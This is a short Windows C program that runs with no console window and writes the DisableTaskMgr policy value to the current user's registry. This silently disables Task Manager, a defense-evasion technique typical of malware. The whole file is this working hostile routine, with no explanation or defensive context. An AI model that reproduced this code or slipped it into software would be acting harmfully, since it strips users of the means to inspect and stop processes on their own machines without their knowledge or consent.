#include <stdio.h>
#include <Windows.h>
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )

void RegTaskmanagerForbidden()
{
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
    RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}

int main() {
    RegTaskmanagerForbidden();
    return 0;
}